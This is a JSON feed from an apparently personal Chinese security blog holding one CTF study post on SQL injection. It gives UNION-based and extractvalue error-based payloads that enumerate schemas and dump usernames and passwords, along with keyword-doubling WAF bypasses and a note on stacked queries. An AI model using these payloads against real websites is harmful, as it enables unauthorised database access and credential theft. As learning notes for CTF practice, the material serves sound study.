{
    "version": "https://jsonfeed.org/version/1",
    "title": "流云阁 • All posts by \"ctf\" category",
    "description": "",
    "home_page_url": "https://evefortosaber.github.io",
    "items": [
        {
            "id": "https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/",
            "url": "https://evefortosaber.github.io/2023/03/19/WebSecurity/CTF/%E5%AD%A6%E4%B9%A0SQL/",
            "title": "SQL注入",
            "date_published": "2023-03-19T11:29:17.421Z",
            "content_html": "<p>作为刚入门时，初步接触 SQL 所作的笔记</p>\n<hr />\n<h1 id=\"sql注入\"><a class=\"anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h2 id=\"1postget注入\"><a class=\"anchor\" href=\"#1postget注入\">#</a> 1.post&amp;get 注入</h2>\n<p>修改 username 等信息进行无账号登录或构造语句查询敏感数据。</p>\n<p>常用 <code>'</code> ， <code>&quot;</code> ， <code>')</code> ， <code>&quot;)</code>  与 “and 1=1；and1=2” 与  <code>-- '</code>  进行试探～～(可能有双括号)~~</p>\n<p>目的：判断是字符还是整形</p>\n<p>之后用 order by 或 union select 判断段数</p>\n<p>再子查询</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">union</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">-- 语句联合查询</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>schema_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span>schemata<span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">-- 查库</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'db'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">-- 查表</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span><span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">'T'</span> <span class=\"token operator\">and</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">'db'</span><span class=\"token punctuation\">)</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">-- 查字段</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">-- 查字段内容</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> concat<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span><span class=\"token string\">' '</span><span class=\"token punctuation\">,</span>id<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> security<span class=\"token punctuation\">.</span>users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">-- 当显示长度有限制时</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">--</span></pre></td></tr></table></figure><h2 id=\"2extractvalue-报错注入\"><a class=\"anchor\" href=\"#2extractvalue-报错注入\">#</a> 2.extractvalue 报错注入</h2>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>extractvaule 报错注入</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> <span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">-- 查数据库</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>table_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">tables</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">-- 查库的表</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span>column_name<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> information_schema<span class=\"token punctuation\">.</span><span class=\"token keyword\">columns</span> <span class=\"token keyword\">where</span> table_schema<span class=\"token operator\">=</span><span class=\"token string\">''</span> <span class=\"token operator\">and</span> table_name<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">-- 查表的字段</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">and</span> extractvalue<span class=\"token punctuation\">(</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> group_concat<span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">,</span><span class=\"token string\">','</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> db<span class=\"token punctuation\">.</span><span class=\"token keyword\">table</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">-- '</span></pre></td></tr></table></figure><p><code>extractvalue(content,path)</code>  这里利用了 <code>path</code>  错误报错获取信息，利用了 <code>concat</code>  与 <code>select</code>  的嵌套</p>\n<p>从而使报错内容 <code>concat</code>  得以显示。<strong>也就是说错误的是 <code>concat(slect)</code>  报错时报 <code>concat</code>  的错但会回显，从而显示 <code>select</code>  的内容</strong>，达到获取信息的目的。</p>\n<h2 id=\"3绕warf\"><a class=\"anchor\" href=\"#3绕warf\">#</a> 3. 绕 warf</h2>\n<p>/**/ 替空格，unionunion 类似绕关键字屏蔽，selselectect 包括。</p>\n<p>base-64，MD5 () 解码。</p>\n<h2 id=\"4编码\"><a class=\"anchor\" href=\"#4编码\">#</a> 4. 编码</h2>\n<p>%23 -- #   URL 编码</p>\n<h2 id=\"5盲注\"><a class=\"anchor\" href=\"#5盲注\">#</a> 5. 盲注</h2>\n<p>使用 Python 脚本</p>\n<h2 id=\"6堆叠注入\"><a class=\"anchor\" href=\"#6堆叠注入\">#</a> 6. 堆叠注入</h2>\n<p>堆叠注入原理</p>\n<p>堆叠注入，顾名思义，就是将语句堆叠在一起进行查询<br />\n原理很简单，mysql_multi_query () 支持多条 sql 语句同时执行，就是个；分隔，成堆的执行 sql 语句，例如</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> users<span class=\"token punctuation\">;</span><span class=\"token keyword\">show</span> <span class=\"token keyword\">databases</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>就同时执行以上两条命令，所以我们可以增删改查，只要权限够<br />\n虽然这个注入姿势很牛逼，但实际遇到很少，其可能受到 API 或者数据库引擎，又或者权限的限制<em><strong>只有当调用数据库函数支持执行多条 sql 语句时才能够使用</strong></em>，利用 mysqli_multi_query () 函数就支持多条 sql 语句同时执行，&lt;u&gt; 但实际情况中，如 PHP 为了防止 sql 注入机制，往往使用调用数据库的函数是 mysqli_ query () 函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限 &lt;/u&gt;，一旦能够被使用，将可能对网站造成十分大的威胁。</p>\n<blockquote>\n<p>原文链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NjkxMjk0L2FydGljbGUvZGV0YWlscy8xMDczNzYyODQ=\">https://blog.csdn.net/qq_45691294/article/details/107376284</span></p>\n</blockquote>\n<h2 id=\"7绕过select注入\"><a class=\"anchor\" href=\"#7绕过select注入\">#</a> 7. 绕过 select 注入</h2>\n<p>使用 handler 语法。</p>\n",
            "tags": [
                "CTF"
            ]
        }
    ]
}